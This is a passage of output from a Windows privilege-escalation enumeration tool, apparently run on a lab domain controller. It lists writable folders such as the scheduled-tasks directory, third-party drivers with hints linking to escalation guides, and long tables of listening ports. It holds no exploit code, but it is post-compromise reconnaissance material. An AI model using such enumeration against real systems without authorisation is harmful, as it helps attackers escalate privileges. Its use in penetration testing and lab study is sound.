    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--
È Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries

ÉÍÍÍÍÍÍÍÍÍÍ¹ Device Drivers --Non Microsoft--
È Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#vulnerable-drivers
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    VMware vSockets Service - 9.8.12.0 build-8538197 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    VMware PCI VMCI Bus Device - 9.8.6.0 build-3966680 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadi.sys
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadfcoei.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.0.247.8000 01/26/2016 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxfcoe.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.0.247.8000 01/26/2016 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxstor.sys
    QLogic Fibre Channel Stor Miniport Driver - 9.1.15.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql2300i.sys
    QLA40XX iSCSI Host Bus Adapter - 2.1.5.0 (STOREx wx64) [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql40xx2i.sys
    QLogic FCoE Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qlfcoei.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    Intel(R) Rapid Storage Technology driver (inbox) - 13.2.0.1022 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAV.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
    Microsoftr Windowsr Operating System - 10.0.14304.1001 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
    Microsoftr Windowsr Operating System - 10.0.14304.1001 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
    MEGASAS RAID Controller Driver for Windows - 6.603.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
    QLogic iSCSI offload driver - 7.14.1.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxois.sys
    QLogic FCoE Offload driver - 7.14.4.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxfcoe.sys
    VMware Pointing PS/2 Device Driver - 12.5.7.0 build-3574480 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
    VMware SVGA 3D - 8.16.01.0001 - build-9329519 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
    VMware SVGA 3D - 8.16.01.0001 - build-9329519 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
    Intel(R) Gigabit Adapter - 12.15.22.6 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\e1i63x64.sys
    VMware server memory controller - 7.4.2.0 build-5980934 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Network Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Shares
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate Network Mapped Drives (WMI)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Host File

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Ifaces and known hosts
È The masks are only for the IPv4 addresses 
  [X] Exception: The requested protocol has not been configured into the system, or no implementation for it exists
    Ethernet0[00:50:56:B9:F3:DA]: 10.129.215.16, fe80::2c44:2c0f:6f9d:160b%5 / 255.255.0.0
        Gateways: 10.129.0.1
        DNSs: 127.0.0.1
    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               88            0.0.0.0               0               Listening         580             lsass
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         808             svchost
  TCP        0.0.0.0               389           0.0.0.0               0               Listening         580             lsass
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               464           0.0.0.0               0               Listening         580             lsass
  TCP        0.0.0.0               593           0.0.0.0               0               Listening         808             svchost
  TCP        0.0.0.0               636           0.0.0.0               0               Listening         580             lsass
  TCP        0.0.0.0               3268          0.0.0.0               0               Listening         580             lsass
  TCP        0.0.0.0               3269          0.0.0.0               0               Listening         580             lsass
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               9389          0.0.0.0               0               Listening         1880            Microsoft.ActiveDirectory.WebServices
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         444             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         900             svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         984             svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         580             lsass
  TCP        0.0.0.0               49671         0.0.0.0               0               Listening         1084            svchost
  TCP        0.0.0.0               49676         0.0.0.0               0               Listening         580             lsass
  TCP        0.0.0.0               49677         0.0.0.0               0               Listening         580             lsass
  TCP        0.0.0.0               49681         0.0.0.0               0               Listening         572             services
  TCP        0.0.0.0               49699         0.0.0.0               0               Listening         1924            dns
  TCP        0.0.0.0               52903         0.0.0.0               0               Listening         1908            dfsrs
  TCP        10.129.215.16         53            0.0.0.0               0               Listening         1924            dns
  TCP        10.129.215.16         139           0.0.0.0               0               Listening         4               System
  TCP        10.129.215.16         389           10.129.215.16         58555           Established       580             lsass
  TCP        10.129.215.16         5985          10.10.14.45           52850           Established       4               System
  TCP        10.129.215.16         58349         10.10.14.45           445             Established       4               System
  TCP        10.129.215.16         58555         10.129.215.16         389             Established       1880            Microsoft.ActiveDirectory.WebServices
  TCP        127.0.0.1             53            0.0.0.0               0               Listening         1924            dns

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        88            [::]                                        0               Listening         580             lsass
  TCP        [::]                                        135           [::]                                        0               Listening         808             svchost
  TCP        [::]                                        389           [::]                                        0               Listening         580             lsass
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        464           [::]                                        0               Listening         580             lsass
  TCP        [::]                                        593           [::]                                        0               Listening         808             svchost
  TCP        [::]                                        636           [::]                                        0               Listening         580             lsass
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        9389          [::]                                        0               Listening         1880            Microsoft.ActiveDirectory.WebServices
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         444             wininit
  TCP        [::]                                        49665         [::]                                        0               Listening         900             svchost
  TCP        [::]                                        49666         [::]                                        0               Listening         984             svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         580             lsass
  TCP        [::]                                        49671         [::]                                        0               Listening         1084            svchost
  TCP        [::]                                        49676         [::]                                        0               Listening         580             lsass
  TCP        [::]                                        49677         [::]                                        0               Listening         580             lsass
  TCP        [::]                                        49681         [::]                                        0               Listening         572             services
  TCP        [::]                                        49699         [::]                                        0               Listening         1924            dns
  TCP        [::]                                        52903         [::]                                        0               Listening         1908            dfsrs
  TCP        [::1]                                       53            [::]                                        0               Listening         1924            dns
  TCP        [::1]                                       389           [::1]                                       49679           Established       580             lsass
  TCP        [::1]                                       389           [::1]                                       49680           Established       580             lsass
  TCP        [::1]                                       389           [::1]                                       52761           Established       580             lsass
  TCP        [::1]                                       389           [::1]                                       53159           Established       580             lsass
  TCP        [::1]                                       389           [::1]                                       58260           Established       580             lsass
  TCP        [::1]                                       389           [::1]                                       58547           Established       580             lsass
  TCP        [::1]                                       389           [::1]                                       58557           Established       580             lsass
  TCP        [::1]                                       389           [::1]                                       58564           Established       580             lsass
  TCP        [::1]                                       389           [::1]                                       59819           Established       580             lsass
  TCP        [::1]                                       49679         [::1]                                       389             Established       1892            ismserv
  TCP        [::1]                                       49680         [::1]                                       389             Established       1892            ismserv
  TCP        [::1]                                       52761         [::1]                                       389             Established       1880            Microsoft.ActiveDirectory.WebServices
  TCP        [::1]                                       53159         [::1]                                       389             Established       1880            Microsoft.ActiveDirectory.WebServices
  TCP        [::1]                                       58260         [::1]                                       389             Established       1880            Microsoft.ActiveDirectory.WebServices
  TCP        [::1]                                       58547         [::1]                                       389             Established       1880            Microsoft.ActiveDirectory.WebServices
  TCP        [::1]                                       58557         [::1]                                       389             Established       1880            Microsoft.ActiveDirectory.WebServices
  TCP        [::1]                                       58564         [::1]                                       389             Established       1880            Microsoft.ActiveDirectory.WebServices
  TCP        [::1]                                       59819         [::1]                                       389             Established       1924            dns
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               53            [::]                                        0               Listening         1924            dns
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               135           [fe80::2c44:2c0f:6f9d:160b%5]               65378           Established       808             svchost
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               389           [fe80::2c44:2c0f:6f9d:160b%5]               58549           Established       580             lsass
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               389           [fe80::2c44:2c0f:6f9d:160b%5]               58559           Established       580             lsass
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               389           [fe80::2c44:2c0f:6f9d:160b%5]               58566           Established       580             lsass
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               389           [fe80::2c44:2c0f:6f9d:160b%5]               59835           Established       580             lsass
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               389           [fe80::2c44:2c0f:6f9d:160b%5]               59837           Established       580             lsass
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               389           [fe80::2c44:2c0f:6f9d:160b%5]               59838           Established       580             lsass
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               389           [fe80::2c44:2c0f:6f9d:160b%5]               59842           Established       580             lsass
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               9389          [fe80::2c44:2c0f:6f9d:160b%5]               52763           Established       1880            Microsoft.ActiveDirectory.WebServices
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               9389          [fe80::2c44:2c0f:6f9d:160b%5]               52764           Established       1880            Microsoft.ActiveDirectory.WebServices
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               9389          [fe80::2c44:2c0f:6f9d:160b%5]               58518           Established       1880            Microsoft.ActiveDirectory.WebServices
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               9389          [fe80::2c44:2c0f:6f9d:160b%5]               58519           Established       1880            Microsoft.ActiveDirectory.WebServices
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               9389          [fe80::2c44:2c0f:6f9d:160b%5]               58520           Established       1880            Microsoft.ActiveDirectory.WebServices
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               49667         [fe80::2c44:2c0f:6f9d:160b%5]               52900           Established       580             lsass
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               49667         [fe80::2c44:2c0f:6f9d:160b%5]               53210           Established       580             lsass
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               49667         [fe80::2c44:2c0f:6f9d:160b%5]               61140           Established       580             lsass
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               52763         [fe80::2c44:2c0f:6f9d:160b%5]               9389            Established       3056            powershell
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               52764         [fe80::2c44:2c0f:6f9d:160b%5]               9389            Established       3056            powershell
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               52900         [fe80::2c44:2c0f:6f9d:160b%5]               49667           Established       1908            dfsrs
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               53210         [fe80::2c44:2c0f:6f9d:160b%5]               49667           Established       580             lsass
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               58315         [fe80::2c44:2c0f:6f9d:160b%5]               9389            Time Wait         0               Idle
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               58357         [fe80::2c44:2c0f:6f9d:160b%5]               9389            Time Wait         0               Idle
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               58358         [fe80::2c44:2c0f:6f9d:160b%5]               9389            Time Wait         0               Idle
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               58496         [fe80::2c44:2c0f:6f9d:160b%5]               135             Time Wait         0               Idle
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               58518         [fe80::2c44:2c0f:6f9d:160b%5]               9389            Established       3056            powershell
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               58519         [fe80::2c44:2c0f:6f9d:160b%5]               9389            Established       3056            powershell
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               58520         [fe80::2c44:2c0f:6f9d:160b%5]               9389            Established       3056            powershell
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               58549         [fe80::2c44:2c0f:6f9d:160b%5]               389             Established       1880            Microsoft.ActiveDirectory.WebServices
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               58559         [fe80::2c44:2c0f:6f9d:160b%5]               389             Established       1880            Microsoft.ActiveDirectory.WebServices
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               58566         [fe80::2c44:2c0f:6f9d:160b%5]               389             Established       1880            Microsoft.ActiveDirectory.WebServices
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               59835         [fe80::2c44:2c0f:6f9d:160b%5]               389             Established       3056            powershell
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               59837         [fe80::2c44:2c0f:6f9d:160b%5]               389             Established       1924            dns
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               59838         [fe80::2c44:2c0f:6f9d:160b%5]               389             Established       1908            dfsrs
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               59842         [fe80::2c44:2c0f:6f9d:160b%5]               389             Established       1908            dfsrs
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               61140         [fe80::2c44:2c0f:6f9d:160b%5]               49667           Established       1880            Microsoft.ActiveDirectory.WebServices
  TCP        [fe80::2c44:2c0f:6f9d:160b%5]               65378         [fe80::2c44:2c0f:6f9d:160b%5]               135             Established       1880            Microsoft.ActiveDirectory.WebServices

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current UDP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            912               svchost
  UDP        0.0.0.0               389           *:*                            580               lsass
  UDP        0.0.0.0               500           *:*                            984               svchost
  UDP        0.0.0.0               4500          *:*                            984               svchost
  UDP        0.0.0.0               5353          *:*                            992               svchost
  UDP        0.0.0.0               5355          *:*                            992               svchost
  UDP        0.0.0.0               51873         *:*                            1924              dns
  UDP        0.0.0.0               51874         *:*                            1924              dns
  UDP        0.0.0.0               51875         *:*                            1924              dns
  UDP        0.0.0.0               51876         *:*                            1924              dns
  UDP        0.0.0.0               51877         *:*                            1924              dns
  UDP        0.0.0.0               51878         *:*                            1924              dns
  UDP        0.0.0.0               51879         *:*                            1924              dns
  UDP        0.0.0.0               51880         *:*                            1924              dns
  UDP        0.0.0.0               51881         *:*                            1924              dns
  UDP        0.0.0.0               51882         *:*                            1924              dns
  UDP        0.0.0.0               51883         *:*                            1924              dns
  UDP        0.0.0.0               51884         *:*                            1924              dns
  UDP        0.0.0.0               51885         *:*                            1924              dns
  UDP        0.0.0.0               51886         *:*                            1924              dns
  UDP        0.0.0.0               51887         *:*                            1924              dns
  UDP        0.0.0.0               51888         *:*                            1924              dns
  UDP        0.0.0.0               51889         *:*                            1924              dns
  UDP        0.0.0.0               51890         *:*                            1924              dns
  UDP        0.0.0.0               51891         *:*                            1924              dns
  UDP        0.0.0.0               51892         *:*                            1924              dns
  UDP        0.0.0.0               51893         *:*                            1924              dns
  UDP        0.0.0.0               51894         *:*                            1924              dns
  UDP        0.0.0.0               51895         *:*                            1924              dns
  UDP        0.0.0.0               51896         *:*                            1924              dns
  UDP        0.0.0.0               51897         *:*                            1924              dns
  UDP        0.0.0.0               51898         *:*                            1924              dns
  UDP        0.0.0.0               51899         *:*                            1924              dns
  UDP        0.0.0.0               51900         *:*                            1924              dns
  UDP        0.0.0.0               51901         *:*                            1924              dns
  UDP        0.0.0.0               51902         *:*                            1924              dns
  UDP        0.0.0.0               51903         *:*                            1924              dns
  UDP        0.0.0.0               51904         *:*                            1924              dns
  UDP        0.0.0.0               51905         *:*                            1924              dns
  UDP        0.0.0.0               51906         *:*                            1924              dns
  UDP        0.0.0.0               51907         *:*                            1924              dns
  UDP        0.0.0.0               51908         *:*                            1924              dns
  UDP        0.0.0.0               51909         *:*                            1924              dns
  UDP        0.0.0.0               51910         *:*                            1924              dns
  UDP        0.0.0.0               51911         *:*                            1924              dns
  UDP        0.0.0.0               51912         *:*                            1924              dns
  UDP        0.0.0.0               51913         *:*                            1924              dns
  UDP        0.0.0.0               51914         *:*                            1924              dns
  UDP        0.0.0.0               51915         *:*                            1924              dns
  UDP        0.0.0.0               51916         *:*                            1924              dns
  UDP        0.0.0.0               51917         *:*                            1924              dns
  UDP        0.0.0.0               51918         *:*                            1924              dns
  UDP        0.0.0.0               51919         *:*                            1924              dns
  UDP        0.0.0.0               51920         *:*                            1924              dns
  UDP        0.0.0.0               51921         *:*                            1924              dns
  UDP        0.0.0.0               51922         *:*                            1924              dns
  UDP        0.0.0.0               51923         *:*                            1924              dns
  UDP        0.0.0.0               51924         *:*                            1924              dns
  UDP        0.0.0.0               51925         *:*                            1924              dns
  UDP        0.0.0.0               51926         *:*                            1924              dns
  UDP        0.0.0.0               51927         *:*                            1924              dns
  UDP        0.0.0.0               51928         *:*                            1924              dns
  UDP        0.0.0.0               51929         *:*                            1924              dns
  UDP        0.0.0.0               51930         *:*                            1924              dns
  UDP        0.0.0.0               51931         *:*                            1924              dns
  UDP        0.0.0.0               51932         *:*                            1924              dns
  UDP        0.0.0.0               51933         *:*                            1924              dns
  UDP        0.0.0.0               51934         *:*                            1924              dns
  UDP        0.0.0.0               51935         *:*                            1924              dns
  UDP        0.0.0.0               51936         *:*                            1924              dns
  UDP        0.0.0.0               51937         *:*                            1924              dns
  UDP        0.0.0.0               51938         *:*                            1924              dns
  UDP        0.0.0.0               51939         *:*                            1924              dns
  UDP        0.0.0.0               51940         *:*                            1924              dns
  UDP        0.0.0.0               51941         *:*                            1924              dns
  UDP        0.0.0.0               51942         *:*                            1924              dns
  UDP        0.0.0.0               51943         *:*                            1924              dns
  UDP        0.0.0.0               51944         *:*                            1924              dns
  UDP        0.0.0.0               51945         *:*                            1924              dns
  UDP        0.0.0.0               51946         *:*                            1924              dns
  UDP        0.0.0.0               51947         *:*                            1924              dns
  UDP        0.0.0.0               51948         *:*                            1924              dns
  UDP        0.0.0.0               51949         *:*                            1924              dns
  UDP        0.0.0.0               51950         *:*                            1924              dns
  UDP        0.0.0.0               51951         *:*                            1924              dns
  UDP        0.0.0.0               51952         *:*                            1924              dns
  UDP        0.0.0.0               51953         *:*                            1924              dns
  UDP        0.0.0.0               51954         *:*                            1924              dns
  UDP        0.0.0.0               51955         *:*                            1924              dns
  UDP        0.0.0.0               51956         *:*                            1924              dns
  UDP        0.0.0.0               51957         *:*                            1924              dns
  UDP        0.0.0.0               51958         *:*                            1924              dns
  UDP        0.0.0.0               51959         *:*                            1924              dns
  UDP        0.0.0.0               51960         *:*                            1924              dns
  UDP        0.0.0.0               51961         *:*                            1924              dns
  UDP        0.0.0.0               51962         *:*                            1924              dns
  UDP        0.0.0.0               51963         *:*                            1924              dns
  UDP        0.0.0.0               51964         *:*                            1924              dns
  UDP        0.0.0.0               51965         *:*                            1924              dns
  UDP        0.0.0.0               51966         *:*                            1924              dns
  UDP        0.0.0.0               51967         *:*                            1924              dns
  UDP        0.0.0.0               51968         *:*                            1924              dns
  UDP        0.0.0.0               51969         *:*                            1924              dns
  UDP        0.0.0.0               51970         *:*                            1924              dns
  UDP        0.0.0.0               51971         *:*                            1924              dns
  UDP        0.0.0.0               51972         *:*                            1924              dns
  UDP        0.0.0.0               51973         *:*                            1924              dns
  UDP        0.0.0.0               51974         *:*                            1924              dns
  UDP        0.0.0.0               51975         *:*                            1924              dns
  UDP        0.0.0.0               51976         *:*                            1924              dns
  UDP        0.0.0.0               51977         *:*                            1924              dns
  UDP        0.0.0.0               51978         *:*                            1924              dns
  UDP        0.0.0.0               51979         *:*                            1924              dns
  UDP        0.0.0.0               51980         *:*                            1924              dns
  UDP        0.0.0.0               51981         *:*                            1924              dns
  UDP        0.0.0.0               51982         *:*                            1924              dns
  UDP        0.0.0.0               51983         *:*                            1924              dns
  UDP        0.0.0.0               51984         *:*                            1924              dns
  UDP        0.0.0.0               51985         *:*                            1924              dns
  UDP        0.0.0.0               51986         *:*                            1924              dns
  UDP        0.0.0.0               51987         *:*                            1924              dns
  UDP        0.0.0.0               51988         *:*                            1924              dns
  UDP        0.0.0.0               51989         *:*                            1924              dns
  UDP        0.0.0.0               51990         *:*                            1924              dns
  UDP        0.0.0.0               51991         *:*                            1924              dns
  UDP        0.0.0.0               51992         *:*                            1924              dns
  UDP        0.0.0.0               51993         *:*                            1924              dns
  UDP        0.0.0.0               51994         *:*                            1924              dns
  UDP        0.0.0.0               51995         *:*                            1924              dns
  UDP        0.0.0.0               51996         *:*                            1924              dns
  UDP        0.0.0.0               51997         *:*                            1924              dns
  UDP        0.0.0.0               51998         *:*                            1924              dns
  UDP        0.0.0.0               51999         *:*                            1924              dns
  UDP        0.0.0.0               52000         *:*                            1924              dns
  UDP        0.0.0.0               52001         *:*                            1924              dns
  UDP        0.0.0.0               52002         *:*                            1924              dns
  UDP        0.0.0.0               52003         *:*                            1924              dns
  UDP        0.0.0.0               52004         *:*                            1924              dns
  UDP        0.0.0.0               52005         *:*                            1924              dns
  UDP        0.0.0.0               52006         *:*                            1924              dns
  UDP        0.0.0.0               52007         *:*                            1924              dns
  UDP        0.0.0.0               52008         *:*                            1924              dns
  UDP        0.0.0.0               52009         *:*                            1924              dns
  UDP        0.0.0.0               52010         *:*                            1924              dns
  UDP        0.0.0.0               52011         *:*                            1924              dns
  UDP        0.0.0.0               52012         *:*                            1924              dns
  UDP        0.0.0.0               52013         *:*                            1924              dns
  UDP        0.0.0.0               52014         *:*                            1924              dns
  UDP        0.0.0.0               52015         *:*                            1924              dns
  UDP        0.0.0.0               52016         *:*                            1924              dns
  UDP        0.0.0.0               52017         *:*                            1924              dns
  UDP        0.0.0.0               52018         *:*                            1924              dns
  UDP        0.0.0.0               52019         *:*                            1924              dns
  UDP        0.0.0.0               52020         *:*                            1924              dns
  UDP        0.0.0.0               52021         *:*                            1924              dns
  UDP        0.0.0.0               52022         *:*                            1924              dns
  UDP        0.0.0.0               52023         *:*                            1924              dns
  UDP        0.0.0.0               52024         *:*                            1924              dns
  UDP        0.0.0.0               52025         *:*                            1924              dns
  UDP        0.0.0.0               52026         *:*                            1924              dns
  UDP        0.0.0.0               52027         *:*                            1924              dns
  UDP        0.0.0.0               52028         *:*                            1924              dns
  UDP        0.0.0.0               52029         *:*                            1924              dns
  UDP        0.0.0.0               52030         *:*                            1924              dns
  UDP        0.0.0.0               52031         *:*                            1924              dns
  UDP        0.0.0.0               52032         *:*                            1924              dns
  UDP        0.0.0.0               52033         *:*                            1924              dns
  UDP        0.0.0.0               52034         *:*                            1924              dns
  UDP        0.0.0.0               52035         *:*                            1924              dns
  UDP        0.0.0.0               52036         *:*                            1924              dns
  UDP        0.0.0.0               52037         *:*                            1924              dns
  UDP        0.0.0.0               52038         *:*                            1924              dns
  UDP        0.0.0.0               52039         *:*                            1924              dns
  UDP        0.0.0.0               52040         *:*                            1924              dns
  UDP        0.0.0.0               52041         *:*                            1924              dns
  UDP        0.0.0.0               52042         *:*                            1924              dns
  UDP        0.0.0.0               52043         *:*                            1924              dns
  UDP        0.0.0.0               52044         *:*                            1924              dns
  UDP        0.0.0.0               52045         *:*                            1924              dns
  UDP        0.0.0.0               52046         *:*                            1924              dns
  UDP        0.0.0.0               52047         *:*                            1924              dns
  UDP        0.0.0.0               52048         *:*                            1924              dns
  UDP        0.0.0.0               52049         *:*                            1924              dns
  UDP        0.0.0.0               52050         *:*                            1924              dns
  UDP        0.0.0.0               52051         *:*                            1924              dns
  UDP        0.0.0.0               52052         *:*                            1924              dns
  UDP        0.0.0.0               52053         *:*                            1924              dns
  UDP        0.0.0.0               52054         *:*                            1924              dns
  UDP        0.0.0.0               52055         *:*                            1924              dns
  UDP        0.0.0.0               52056         *:*                            1924              dns
  UDP        0.0.0.0               52057         *:*                            1924              dns
  UDP        0.0.0.0               52058         *:*                            1924              dns
  UDP        0.0.0.0               52059         *:*                            1924              dns
  UDP        0.0.0.0               52060         *:*                            1924              dns
